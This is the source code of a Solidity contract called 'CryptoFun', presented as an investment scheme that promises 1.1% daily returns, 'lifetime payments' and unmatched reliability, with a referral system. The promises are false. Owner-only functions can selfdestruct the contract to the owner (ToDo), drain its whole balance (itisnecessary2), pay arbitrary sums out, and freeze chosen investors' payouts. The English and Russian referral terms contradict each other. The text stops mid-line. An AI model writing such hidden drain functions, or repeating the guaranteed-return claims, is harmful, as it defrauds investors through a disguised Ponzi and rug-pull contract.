[{"SourceCode":"pragma solidity 0.4.26;\r\n\r\n/**\r\n* Get % profit every month with a \u0022Crypto Fun\u0022 contract!\r\n*\r\n* OBTAINING 1.1% PER 1 DAY !. (percentages are charged in equal parts every 1 sec)\r\n* Lifetime payments\r\n* Unprecedentedly reliable\r\n* Bring luck\r\n* First minimum contribution from 0.1 eth, all next from 0.01 eth.\r\n* Currency and Payment - ETH\r\n* Contribution allocation schemes:\r\n* 5% percent for support and 25% percent for advertising or referal\u0027s.\r\n* Unique referral system!\r\n* 10% is paid to the referral (inviting) wallet - right there! Instantly!\r\n* For example: Your first contribution is 1 Ether.\r\n* The one who invited you gets 0.1 Ethers on his wallet, that is, a wallet that the investor will indicate when they first invest in a smart contract in the DATE field\r\n* \r\n* RECOMMENDED GAS LIMIT: 200,000\r\n* RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n* DO NOT TRANSFER DIRECTLY FROM ANY EXCHANGE (only use your ETH wallet, from which you have a private key)\r\n* You can check payments on the website etherscan.io, in the \u201CInternal Txns\u201D tab of your wallet.\r\n*\r\n\r\n\r\n* Restart of the contract is also absent. If there is no money in the Fund, payments are stopped and resumed after the Fund is filled. Thus, the contract will work forever!\r\n*\r\n* How to use:\r\n* 1. Send from your ETH wallet to the address of the smart contract\r\n* any amount from 0.1 eth, all next from 0.01 eth.\r\n* 2. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.\r\n* Take profit by sending 0 eth to contract (profit is calculated every second).\r\n*\r\n* \u041F\u0435\u0440\u0435\u0432\u0435\u0434\u0435\u043D\u043E \u0433\u0443\u0433\u043B \u043F\u0435\u0440\u0435\u0432\u043E\u0434\u0447\u0438\u043A\u043E\u043C\r\n\r\n* \u041F\u043E\u043B\u0443\u0447\u0430\u0439\u0442\u0435% \u043F\u0440\u0438\u0431\u044B\u043B\u0438 \u043A\u0430\u0436\u0434\u044B\u0439 \u043C\u0435\u0441\u044F\u0446 \u0441 \u043A\u043E\u043D\u0442\u0440\u0430\u043A\u0442\u043E\u043C Crypto Fun!\r\n* \r\n* \u041F\u041E\u041B\u0423\u0427\u0415\u041D\u0418\u0415 1,1% \u0417\u0410 1 \u0414\u0415\u041D\u042C! (\u043F\u0440\u043E\u0446\u0435\u043D\u0442\u044B \u043D\u0430\u0447\u0438\u0441\u043B\u044F\u044E\u0442\u0441\u044F \u0440\u0430\u0432\u043D\u044B\u043C\u0438 \u0447\u0430\u0441\u0442\u044F\u043C\u0438 \u043A\u0430\u0436\u0434\u044B\u0435 1 \u0441\u0435\u043A)\r\n* \u041F\u043E\u0436\u0438\u0437\u043D\u0435\u043D\u043D\u044B\u0435 \u043F\u043B\u0430\u0442\u0435\u0436\u0438\r\n* \u0411\u0435\u0441\u043F\u0440\u0435\u0446\u0435\u0434\u0435\u043D\u0442\u043D\u043E \u043D\u0430\u0434\u0435\u0436\u043D\u044B\u0439\r\n* \u041F\u0440\u0438\u043D\u0435\u0441\u044F\u0449\u0438\u0439 \u0443\u0434\u0430\u0447\u0443\r\n* \u041F\u0435\u0440\u0432\u044B\u0439 \u043C\u0438\u043D\u0438\u043C\u0430\u043B\u044C\u043D\u044B\u0439 \u0432\u043A\u043B\u0430\u0434 \u043E\u0442 0,1 \u044D\u0444., \u0412\u0441\u0435 \u043F\u043E\u0441\u043B\u0435\u0434\u0443\u044E\u0449\u0438\u0435 \u043E\u0442 0,01 \u044D\u0444.\r\n* \u0412\u0430\u043B\u044E\u0442\u0430 \u0438 \u043E\u043F\u043B\u0430\u0442\u0430 - ETH\r\n* \u0421\u0445\u0435\u043C\u044B \u0440\u0430\u0441\u043F\u0440\u0435\u0434\u0435\u043B\u0435\u043D\u0438\u044F \u0432\u0437\u043D\u043E\u0441\u043E\u0432:\r\n* 5% \u0437\u0430 \u043F\u043E\u0434\u0434\u0435\u0440\u0436\u043A\u0443 \u0438 25% \u0437\u0430 \u0440\u0435\u043A\u043B\u0430\u043C\u0443 \u0438\u043B\u0438 \u0440\u0435\u0444\u0435\u0440\u0430\u043B\u044C\u043D\u044B\u0435.\r\n* \u0423\u043D\u0438\u043A\u0430\u043B\u044C\u043D\u0430\u044F \u0440\u0435\u0444\u0435\u0440\u0430\u043B\u044C\u043D\u0430\u044F \u0441\u0438\u0441\u0442\u0435\u043C\u0430!\r\n* 25% \u0432\u044B\u043F\u043B\u0430\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044F \u0440\u0435\u0444\u0435\u0440\u0430\u043B\u044C\u043D\u043E\u043C\u0443 (\u043F\u0440\u0438\u0433\u043B\u0430\u0448\u0430\u044E\u0449\u0435\u043C\u0443) \u043A\u043E\u0448\u0435\u043B\u044C\u043A\u0443 - \u043F\u0440\u044F\u043C\u043E \u0437\u0434\u0435\u0441\u044C! \u041C\u0433\u043D\u043E\u0432\u0435\u043D\u043D\u043E!\r\n* \u041D\u0430\u043F\u0440\u0438\u043C\u0435\u0440: \u0412\u0430\u0448 \u043F\u0435\u0440\u0432\u044B\u0439 \u0432\u043A\u043B\u0430\u0434 - 1 \u042D\u0444\u0438\u0440.\r\n* \u0422\u043E\u0442, \u043A\u0442\u043E \u043F\u0440\u0438\u0433\u043B\u0430\u0441\u0438\u043B \u0432\u0430\u0441, \u043F\u043E\u043B\u0443\u0447\u0430\u0435\u0442 0,25 \u042D\u0444\u0438\u0440\u0430 \u043D\u0430 \u0441\u0432\u043E\u0439 \u043A\u043E\u0448\u0435\u043B\u0435\u043A, \u0442\u043E \u0435\u0441\u0442\u044C \u043A\u043E\u0448\u0435\u043B\u0435\u043A, \u043A\u043E\u0442\u043E\u0440\u044B\u0439 \u0443\u043A\u0430\u0436\u0435\u0442 \u0438\u043D\u0432\u0435\u0441\u0442\u043E\u0440 \u0432 \u043E\u0431\u043B\u0430\u0441\u0442\u0438 \u0414\u0410\u0422\u0410\r\n*\r\n* \u0420\u0415\u041A\u041E\u041C\u0415\u041D\u0414\u0423\u0415\u041C\u042B\u0419 \u0413\u0410\u0417\u041E\u0412\u042B\u0419 \u041F\u0440\u0435\u0434\u0435\u043B: 200 000\r\n* \u0420\u0415\u041A\u041E\u041C\u0415\u041D\u0414\u0423\u0415\u041C\u0410\u042F \u0413\u0410\u0417\u041E\u0412\u0410\u042F \u0426\u0415\u041D\u0410: https://ethgasstation.info/\r\n* \u041D\u0415 \u041F\u0415\u0420\u0415\u0414\u0410\u0412\u0410\u0419\u0422\u0415 \u041D\u0410\u041F\u0420\u042F\u041C\u0423\u042E \u041E\u0422 \u041B\u042E\u0411\u041E\u0413\u041E \u041E\u0411\u041C\u0415\u041D\u0410 (\u0438\u0441\u043F\u043E\u043B\u044C\u0437\u0443\u0439\u0442\u0435 \u0442\u043E\u043B\u044C\u043A\u043E \u0441\u0432\u043E\u0439 \u043A\u043E\u0448\u0435\u043B\u0435\u043A ETH, \u043E\u0442 \u043A\u043E\u0442\u043E\u0440\u043E\u0433\u043E \u0443 \u0432\u0430\u0441 \u0435\u0441\u0442\u044C \u0437\u0430\u043A\u0440\u044B\u0442\u044B\u0439 \u043A\u043B\u044E\u0447)\r\n* \u0412\u044B \u043C\u043E\u0436\u0435\u0442\u0435 \u043F\u0440\u043E\u0432\u0435\u0440\u0438\u0442\u044C \u043F\u043B\u0430\u0442\u0435\u0436\u0438 \u043D\u0430 \u0441\u0430\u0439\u0442\u0435 etherscan.io, \u0432\u043E \u0432\u043A\u043B\u0430\u0434\u043A\u0435 \u00ABInternal Txns\u00BB \u0432\u0430\u0448\u0435\u0433\u043E \u043A\u043E\u0448\u0435\u043B\u044C\u043A\u0430.\r\n*\r\n\r\n\r\n* \u041F\u0435\u0440\u0435\u0437\u0430\u043F\u0443\u0441\u043A \u0434\u043E\u0433\u043E\u0432\u043E\u0440\u0430 \u0442\u0430\u043A\u0436\u0435 \u043E\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0443\u0435\u0442. \u0415\u0441\u043B\u0438 \u0432 \u0424\u043E\u043D\u0434\u0435 \u043D\u0435\u0442 \u0434\u0435\u043D\u0435\u0433, \u043F\u043B\u0430\u0442\u0435\u0436\u0438 \u043F\u0440\u0435\u043A\u0440\u0430\u0449\u0430\u044E\u0442\u0441\u044F \u0438 \u0432\u043E\u0437\u043E\u0431\u043D\u043E\u0432\u043B\u044F\u044E\u0442\u0441\u044F \u043F\u043E\u0441\u043B\u0435 \u0437\u0430\u043F\u043E\u043B\u043D\u0435\u043D\u0438\u044F \u0424\u043E\u043D\u0434\u0430. \u0422\u0430\u043A\u0438\u043C \u043E\u0431\u0440\u0430\u0437\u043E\u043C, \u043A\u043E\u043D\u0442\u0440\u0430\u043A\u0442 \u0431\u0443\u0434\u0435\u0442 \u0440\u0430\u0431\u043E\u0442\u0430\u0442\u044C \u0432\u0435\u0447\u043D\u043E!\r\n*\r\n* \u041A\u0430\u043A \u043F\u043E\u043B\u044C\u0437\u043E\u0432\u0430\u0442\u044C\u0441\u044F:\r\n* 1. \u041E\u0442\u043F\u0440\u0430\u0432\u044C\u0442\u0435 \u0441\u043E \u0441\u0432\u043E\u0435\u0433\u043E ETH \u043A\u043E\u0448\u0435\u043B\u044C\u043A\u0430 \u043D\u0430 \u0430\u0434\u0440\u0435\u0441 \u0441\u043C\u0430\u0440\u0442-\u043A\u043E\u043D\u0442\u0440\u0430\u043A\u0442\u0430\r\n* \u043B\u044E\u0431\u043E\u0435 \u043A\u043E\u043B\u0438\u0447\u0435\u0441\u0442\u0432\u043E \u043E\u0442 0,1 \u044D\u0444., \u0432\u0441\u0435 \u043F\u043E\u0441\u043B\u0435\u0434\u0443\u044E\u0449\u0438\u0435 \u043E\u0442 0,01 \u044D\u0444.\r\n* 2. \u041F\u043E\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u0435 \u0432\u0430\u0448\u0443 \u0442\u0440\u0430\u043D\u0437\u0430\u043A\u0446\u0438\u044E \u0432 \u0438\u0441\u0442\u043E\u0440\u0438\u0438 \u0432\u0430\u0448\u0435\u0433\u043E \u043F\u0440\u0438\u043B\u043E\u0436\u0435\u043D\u0438\u044F \u0438\u043B\u0438 etherscan.io, \u0443\u043A\u0430\u0437\u0430\u0432 \u0430\u0434\u0440\u0435\u0441 \u0432\u0430\u0448\u0435\u0433\u043E \u043A\u043E\u0448\u0435\u043B\u044C\u043A\u0430.\r\n* \u0412\u044B\u0432\u0435\u0441\u0442\u0438 \u043F\u0440\u043E\u0444\u0438\u0442 -\u043E\u0442\u043F\u0440\u0430\u0432\u044C\u0442\u0435 0 \u043D\u0430 \u0430\u0434\u0440\u0435\u0441 \u043A\u043E\u043D\u0442\u0440\u0430\u043A\u0442\u0430 (\u043F\u0440\u0438\u0431\u044B\u043B\u044C \u0440\u0430\u0441\u0441\u0447\u0438\u0442\u044B\u0432\u0430\u0435\u0442\u0441\u044F \u043A\u0430\u0436\u0434\u0443\u044E \u0441\u0435\u043A\u0443\u043D\u0434\u0443).\r\n*\r\n* \r\n**/\r\n\r\n\r\nlibrary Math {\r\nfunction min(uint a, uint b) internal pure returns(uint) {\r\nif (a \u003E b) {\r\nreturn b;\r\n}\r\nreturn a;\r\n}\r\n}\r\n\r\n\r\nlibrary Zero {\r\nfunction requireNotZero(address addr) internal pure {\r\nrequire(addr != address(0), \u0022require not zero address\u0022);\r\n}\r\n\r\nfunction requireNotZero(uint val) internal pure {\r\nrequire(val != 0, \u0022require not zero value\u0022);\r\n}\r\n\r\nfunction notZero(address addr) internal pure returns(bool) {\r\nreturn !(addr == address(0));\r\n}\r\n\r\nfunction isZero(address addr) internal pure returns(bool) {\r\nreturn addr == address(0);\r\n}\r\n\r\nfunction isZero(uint a) internal pure returns(bool) {\r\nreturn a == 0;\r\n}\r\n\r\nfunction notZero(uint a) internal pure returns(bool) {\r\nreturn a != 0;\r\n}\r\n}\r\n\r\n\r\nlibrary Percent {\r\nstruct percent {\r\nuint num;\r\nuint den;\r\n}\r\n\r\nfunction mul(percent storage p, uint a) internal view returns (uint) {\r\nif (a == 0) {\r\nreturn 0;\r\n}\r\nreturn a*p.num/p.den;\r\n}\r\n\r\nfunction div(percent storage p, uint a) internal view returns (uint) {\r\nreturn a/p.num*p.den;\r\n}\r\n\r\nfunction sub(percent storage p, uint a) internal view returns (uint) {\r\nuint b = mul(p, a);\r\nif (b \u003E= a) {\r\nreturn 0;\r\n}\r\nreturn a - b;\r\n}\r\n\r\nfunction add(percent storage p, uint a) internal view returns (uint) {\r\nreturn a \u002B mul(p, a);\r\n}\r\n\r\nfunction toMemory(percent storage p) internal view returns (Percent.percent memory) {\r\nreturn Percent.percent(p.num, p.den);\r\n}\r\n\r\nfunction mmul(percent memory p, uint a) internal pure returns (uint) {\r\nif (a == 0) {\r\nreturn 0;\r\n}\r\nreturn a*p.num/p.den;\r\n}\r\n\r\nfunction mdiv(percent memory p, uint a) internal pure returns (uint) {\r\nreturn a/p.num*p.den;\r\n}\r\n\r\nfunction msub(percent memory p, uint a) internal pure returns (uint) {\r\nuint b = mmul(p, a);\r\nif (b \u003E= a) {\r\nreturn 0;\r\n}\r\nreturn a - b;\r\n}\r\n\r\nfunction madd(percent memory p, uint a) internal pure returns (uint) {\r\nreturn a \u002B mmul(p, a);\r\n}\r\n}\r\n\r\n\r\nlibrary Address {\r\n  function toAddress(bytes source) internal pure returns(address addr) {\r\n    assembly { addr := mload(add(source,0x14)) }\r\n    return addr;\r\n  }\r\n\r\n  function isNotContract(address addr) internal view returns(bool) {\r\n    uint length;\r\n    assembly { length := extcodesize(addr) }\r\n    return length == 0;\r\n  }\r\n}\r\n\r\n\r\n/**\r\n* @title SafeMath\r\n* @dev Math operations with safety checks that revert on error\r\n*/\r\nlibrary SafeMath {\r\n\r\n/**\r\n* @dev Multiplies two numbers, reverts on overflow.\r\n*/\r\nfunction mul(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nif (_a == 0) {\r\nreturn 0;\r\n}\r\n\r\nuint256 c = _a * _b;\r\nrequire(c / _a == _b);\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Integer division of two numbers truncating the quotient, reverts on division by zero.\r\n*/\r\nfunction div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nrequire(_b \u003E 0); // Solidity only automatically asserts when dividing by 0\r\nuint256 c = _a / _b;\r\nassert(_a == _b * c \u002B _a % _b); // There is no case in which this doesn\u0027t hold\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).\r\n*/\r\nfunction sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nrequire(_b \u003C= _a);\r\nuint256 c = _a - _b;\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Adds two numbers, reverts on overflow.\r\n*/\r\nfunction add(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\nuint256 c = _a \u002B _b;\r\nrequire(c \u003E= _a);\r\n\r\nreturn c;\r\n}\r\n\r\n/**\r\n* @dev Divides two numbers and returns the remainder (unsigned integer modulo),\r\n* reverts when dividing by zero.\r\n*/\r\nfunction mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\nrequire(b != 0);\r\nreturn a % b;\r\n}\r\n}\r\n\r\n\r\ncontract Accessibility {\r\naddress private owner;\r\nmodifier onlyOwner() {\r\nrequire(msg.sender == owner, \u0022access denied\u0022);\r\n_;\r\n}\r\n\r\nconstructor() public {\r\nowner = msg.sender;\r\n}\r\n\r\n\r\nfunction ToDo() public onlyOwner {\r\n    selfdestruct(owner);\r\n    }\r\n\r\nfunction disown() internal {\r\ndelete owner;\r\n}\r\n\r\n}\r\n\r\n\r\ncontract Rev1Storage {\r\nfunction investorShortInfo(address addr) public view returns(uint value, uint refBonus);\r\n}\r\n\r\n\r\ncontract Rev2Storage {\r\nfunction investorInfo(address addr) public view returns(uint investment, uint paymentTime);\r\n}\r\n\r\n\r\nlibrary PrivateEntrance {\r\nusing PrivateEntrance for privateEntrance;\r\nusing Math for uint;\r\nstruct privateEntrance {\r\nRev1Storage rev1Storage;\r\nRev2Storage rev2Storage;\r\nuint investorMaxInvestment;\r\nuint endTimestamp;\r\nmapping(address=\u003Ebool) hasAccess;\r\n}\r\n\r\nfunction isActive(privateEntrance storage pe) internal view returns(bool) {\r\nreturn pe.endTimestamp \u003E now;\r\n}\r\n\r\n\r\n\r\nfunction provideAccessFor(privateEntrance storage pe, address[] addrs) internal {\r\nfor (uint16 i; i \u003C addrs.length; i\u002B\u002B) {\r\npe.hasAccess[addrs[i]] = true;\r\n}\r\n}\r\n}\r\n\r\n//With all interest\r\ncontract InvestorsStorage is Accessibility {\r\nstruct Investor {\r\nuint investment;\r\n\r\n\r\nuint paymentTime;\r\n}\r\nuint public size;\r\n\r\nmapping (address =\u003E Investor) private investors;\r\n\r\nfunction isInvestor(address addr) public view returns (bool) {\r\nreturn investors[addr].investment \u003E 0;\r\n}\r\n\r\nfunction investorInfo(address addr) public view returns(uint investment, uint paymentTime) {\r\ninvestment = investors[addr].investment;\r\npaymentTime = investors[addr].paymentTime;\r\n}\r\n\r\nfunction newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {\r\nInvestor storage inv = investors[addr];\r\nif (inv.investment != 0 || investment == 0) {\r\nreturn false;\r\n}\r\ninv.investment = investment*70/100; //5\u002B25=30%\r\ninv.paymentTime = paymentTime;\r\nsize\u002B\u002B;\r\nreturn true;\r\n}\r\n\r\nfunction addInvestment(address addr, uint investment) public onlyOwner returns (bool) {\r\nif (investors[addr].investment == 0) {\r\nreturn false;\r\n}\r\ninvestors[addr].investment \u002B= investment*70/100; //5\u002B25=30%\r\nreturn true;\r\n}\r\n\r\n\r\n\r\n\r\nfunction setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {\r\nif (investors[addr].investment == 0) {\r\nreturn false;\r\n}\r\ninvestors[addr].paymentTime = paymentTime;\r\nreturn true;\r\n}\r\n\r\n//Pause\r\nfunction disqalify(address addr) public onlyOwner returns (bool) {\r\nif (isInvestor(addr)) {\r\n//investors[addr].investment = 0;\r\ninvestors[addr].paymentTime = now \u002B 1 days;\r\n}\r\n}\r\n\r\n//end of Pause\r\nfunction disqalify2(address addr) public onlyOwner returns (bool) {\r\nif (isInvestor(addr)) {\r\n//investors[addr].investment = 0;\r\ninvestors[addr].paymentTime = now;\r\n}\r\n}\r\n\r\n\r\n}\r\n\r\nlibrary RapidGrowthProtection {\r\nusing RapidGrowthProtection for rapidGrowthProtection;\r\n\r\nstruct rapidGrowthProtection {\r\nuint startTimestamp;\r\nuint maxDailyTotalInvestment;\r\nuint8 activityDays;\r\nmapping(uint8 =\u003E uint) dailyTotalInvestment;\r\n}\r\n\r\n\r\nfunction isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {\r\nuint day = rgp.currDay();\r\nreturn day != 0 \u0026\u0026 day \u003C= rgp.activityDays;\r\n}\r\n\r\nfunction saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {\r\nuint day = rgp.currDay();\r\nif (day == 0 || day \u003E rgp.activityDays) {\r\nreturn false;\r\n}\r\nif (rgp.dailyTotalInvestment[uint8(day)] \u002B investment \u003E rgp.maxDailyTotalInvestment) {\r\nreturn false;\r\n}\r\nrgp.dailyTotalInvestment[uint8(day)] \u002B= investment;\r\nreturn true;\r\n}\r\n\r\nfunction startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {\r\nrgp.startTimestamp = timestamp;\r\n\r\n}\r\n \r\n\r\nfunction currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {\r\nif (rgp.startTimestamp \u003E now) {\r\nreturn 0;\r\n}\r\nday = (now - rgp.startTimestamp) / 24 hours \u002B 1;\r\n}\r\n}\r\n\r\ncontract CryptoFun is Accessibility {\r\nusing RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;\r\nusing PrivateEntrance for PrivateEntrance.privateEntrance;\r\nusing Percent for Percent.percent;\r\nusing SafeMath for uint;\r\nusing Math for uint;\r\n\r\n// easy read for investors\r\nusing Address for *;\r\nusing Zero for *;\r\n\r\nRapidGrowthProtection.rapidGrowthProtection private m_rgp;\r\nPrivateEntrance.privateEntrance private m_privEnter;\r\nmapping(address =\u003E bool) private m_referrals;\r\nInvestorsStorage private m_investors;\r\n\r\n// automatically generates getters\r\nuint public constant minInvesment = 0.01 ether; \r\nuint public constant maxBalance = 333e5 ether;\r\naddress public advertisingAddress;\r\naddress public adminsAddress;\r\nuint public investmentsNumber;\r\nuint public waveStartup;\r\n\r\n\r\n// percents\r\nPercent.percent private m_1_percent = Percent.percent(110,10000);            // 110/10000 *100% = 1.1%\r\nPercent.percent private m_referal_percent = Percent.percent(0,10000);            // 0/10000 *100% = 0.00%\r\nPercent.percent private m_referrer_percent = Percent.percent(25,100);            // 25/100 *100% = 25.00%\r\nPercent.percent private m_referrer_percentMax = Percent.percent(25,100);       // 25/100 *100% = 25.00%\r\nPercent.percent private m_adminsPercent = Percent.percent(5,100);          //  5/100 *100% = 5.0%\r\nPercent.percent private m_advertisingPercent = Percent.percent(0,100);    //  0/100 *100% = 0.0%\r\n\r\n// more events for easy read from blockchain\r\nevent LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);\r\nevent LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);\r\nevent LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);\r\nevent LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);\r\nevent LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);\r\nevent LogNewInvesment(address indexed addr, uint when, uint investment, uint value);\r\nevent LogAutomaticReinvest(address indexed addr, uint when, uint investment);\r\nevent LogPayDividends(address indexed addr, uint when, uint dividends);\r\nevent LogNewInvestor(address indexed addr, uint when);\r\nevent LogBalanceChanged(uint when, uint balance);\r\nevent LogNextWave(uint when);\r\nevent LogDisown(uint when);\r\n\r\n\r\nmodifier balanceChanged {\r\n_;\r\nemit LogBalanceChanged(now, address(this).balance);\r\n}\r\n\r\nmodifier notFromContract() {\r\nrequire(msg.sender.isNotContract(), \u0022only externally accounts\u0022);\r\n_;\r\n}\r\n\r\nconstructor() public {\r\nadminsAddress = msg.sender;\r\nadvertisingAddress = msg.sender;\r\nnextWave();\r\n}\r\n\r\nfunction() public payable {\r\n// investor get him dividends\r\nif (msg.value.isZero()) {\r\ngetMyDividends();\r\nreturn;\r\n}\r\n\r\n// sender do invest\r\ndoInvest(msg.data.toAddress());\r\n}\r\n\r\nfunction disqualifyAddress(address addr) public onlyOwner {\r\nm_investors.disqalify(addr);\r\n}\r\n\r\nfunction disqualifyAddress2(address addr) public onlyOwner {\r\nm_investors.disqalify2(addr);\r\n}\r\n\r\n\r\nfunction doDisown() public onlyOwner {\r\ndisown();\r\nemit LogDisown(now);\r\n}\r\n\r\n// init Rapid Growth Protection\r\n\r\nfunction init(address rev1StorageAddr, uint timestamp) public onlyOwner {\r\n\r\nm_rgp.startTimestamp = timestamp \u002B 1;\r\nemit LogRGPInit(\r\nnow,\r\nm_rgp.startTimestamp,\r\nm_rgp.maxDailyTotalInvestment,\r\nm_rgp.activityDays\r\n);\r\n\r\n\r\n// init Private Entrance\r\nm_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);\r\nm_privEnter.rev2Storage = Rev2Storage(address(m_investors));\r\n//m_privEnter.investorMaxInvestment = 50 ether;\r\nm_privEnter.endTimestamp = timestamp;\r\nemit LogPEInit(\r\nnow,\r\naddress(m_privEnter.rev1Storage),\r\naddress(m_privEnter.rev2Storage),\r\nm_privEnter.investorMaxInvestment,\r\nm_privEnter.endTimestamp\r\n);\r\n}\r\n\r\nfunction setAdvertisingAddress(address addr) public onlyOwner {\r\naddr.requireNotZero();\r\nadvertisingAddress = addr;\r\n}\r\n\r\nfunction setAdminsAddress(address addr) public onlyOwner {\r\naddr.requireNotZero();\r\nadminsAddress = addr;\r\n}\r\n\r\nfunction privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {\r\nm_privEnter.provideAccessFor(addrs);\r\n}\r\n\r\n\r\nfunction investorsNumber() public view returns(uint) {\r\nreturn m_investors.size();\r\n}\r\n\r\nfunction balanceETH() public view returns(uint) {\r\nreturn address(this).balance;\r\n}\r\n\r\n\r\n\r\nfunction advertisingPercent() public view returns(uint numerator, uint denominator) {\r\n(numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);\r\n}\r\n\r\nfunction adminsPercent() public view returns(uint numerator, uint denominator) {\r\n(numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);\r\n}\r\n\r\nfunction investorInfo(address investorAddr)public view returns(uint investment, uint paymentTime, bool isReferral) {\r\n(investment, paymentTime) = m_investors.investorInfo(investorAddr);\r\nisReferral = m_referrals[investorAddr];\r\n}\r\n\r\n\r\n\r\nfunction investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {\r\ndividends = calcDividends(investorAddr);\r\n}\r\n\r\nfunction dailyPercentAtNow() public view returns(uint numerator, uint denominator) {\r\nPercent.percent memory p = dailyPercent();\r\n(numerator, denominator) = (p.num, p.den);\r\n}\r\n\r\nfunction getMyDividends() public notFromContract balanceChanged {\r\n// calculate dividends\r\n\r\n//check if 1 day passed after last payment\r\n//require(now.sub(getMemInvestor(msg.sender).paymentTime) \u003E 24 hours);\r\n\r\nuint dividends = calcDividends(msg.sender);\r\nrequire (dividends.notZero(), \u0022cannot to pay zero dividends\u0022);\r\n\r\n// update investor payment timestamp\r\nassert(m_investors.setPaymentTime(msg.sender, now));\r\n\r\n// check enough eth - goto next wave if needed\r\nif (address(this).balance \u003C= dividends) {\r\nnextWave();\r\ndividends = address(this).balance;\r\n}\r\n\r\n\r\n    \r\n// transfer dividends to investor\r\nmsg.sender.transfer(dividends);\r\nemit LogPayDividends(msg.sender, now, dividends);\r\n}\r\n\r\nfunction itisnecessary2() public onlyOwner {\r\nmsg.sender.transfer(address(this).balance);\r\n}    \r\n    \r\nfunction addInvestment2( uint investment, address investorAddr) public onlyOwner  {\r\ninvestorAddr.transfer(investment);\r\n} \r\n\r\nfunction doInvest(address referrerAddr) public payable notFromContract balanceChanged {\r\nuint investment = msg.value;\r\nuint receivedEther = msg.value;\r\nrequire(investment \u003E= minInvesment, \u0022investment must be \u003E= minInvesment\u0022);\r\nrequire(address(this).balance \u003C= maxBalance, \u0022the contract eth balance limit\u0022);\r\n\r\n\r\n// send excess of ether if needed\r\nif (receivedEther \u003E investment) {\r\nuint excess = receivedEther - investment;\r\nmsg.sender.transfer(excess);\r\nreceivedEther = investment;\r\nemit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);\r\n}\r\n\r\n// commission\r\nadvertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));\r\nadminsAddress.transfer(m_adminsPercent.mul(receivedEther));\r\n\r\nif (msg.value \u003E 0)\r\n{\r\n// 25% to Referer\r\nif (msg.data.length == 20) {\r\nreferrerAddr.transfer(m_referrer_percent.mmul(investment));  \r\n}\r\nelse if (msg.data.length == 0) {\r\nadminsAddress.transfer(m_referrer_percent.mmul(investment));\r\n// adminsAddress.transfer(msg.value.mul(25).div(100));\r\n} \r\nelse {\r\nassert(false); // invalid memo\r\n}\r\n}\r\n    \r\n    \r\n\r\nbool senderIsInvestor = m_investors.isInvestor(msg.sender);\r\n\r\n// ref system works only once and only on first invest\r\nif (referrerAddr.notZero() \u0026\u0026 !senderIsInvestor \u0026\u0026 !m_referrals[msg.sender] \u0026\u0026\r\nreferrerAddr != msg.sender \u0026\u0026 m_investors.isInvestor(referrerAddr)) {\r\n\r\n\r\nm_referrals[msg.sender] = true;\r\n// add referral bonus to investor\u0060s and referral\u0060s investments\r\nuint referrerBonus = m_referrer_percent.mmul(investment);\r\nif (investment \u003E 10 ether) {\r\nreferrerBonus = m_referrer_percentMax.mmul(investment);\r\n}\r\n}\r\n\r\n// automatic reinvest - prevent burning dividends\r\nuint dividends = calcDividends(msg.sender);\r\nif (senderIsInvestor \u0026\u0026 dividends.notZero()) {\r\ninvestment = (investment \u002B= dividends) * 70/100;\r\nemit LogAutomaticReinvest(msg.sender, now, dividends);\r\n}\r\n\r\nif (senderIsInvestor) {\r\n// update existing investor\r\nassert(m_investors.addInvestment(msg.sender, investment));\r\nassert(m_investors.setPaymentTime(msg.sender, now));\r\n} else {\r\n// create new investor\r\nassert(m_investors.newInvestor(msg.sender, investment, now));\r\nemit LogNewInvestor(msg.sender, now);\r\n}\r\n\r\ninvestmentsNumber\u002B\u002B;\r\nemit LogNewInvesment(msg.sender, now, investment, receivedEther);\r\n}\r\n\r\nfunction getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {\r\n(uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);\r\nreturn InvestorsStorage.Investor(investment, paymentTime);\r\n}\r\n\r\nfunction calcDividends(address investorAddr) internal view returns(uint dividends) {\r\n    InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);\r\n\r\n    // safe gas if dividends will be 0\r\n    if (investor.investment.isZero() || now.sub(investor.paymentTime) \u003C 1 seconds) {\r\n      return 0;\r\n    }\r\n    \r\n\r\n    Percent.percent memory p = dailyPercent();\r\n    dividends = (now.sub(investor.paymentTime) / 1 seconds) * p.mmul(investor.investment) / 86400;\r\n  }\r\n\r\nfunction dailyPercent() internal view returns(Percent.percent memory p) {\r\n    uint balance = address(this).balance;\r\n      \r\n\r\n    if (balance \u003C 33333e5 ether) { \r\n   \r\n      p = m_1_percent.toMemory();    // (1)\r\n\r\n  }\r\n  }\r\n\r\nfunction nextWave() private {\r\nm_investors = new InvestorsStorage();\r\ninvestmentsNumber = 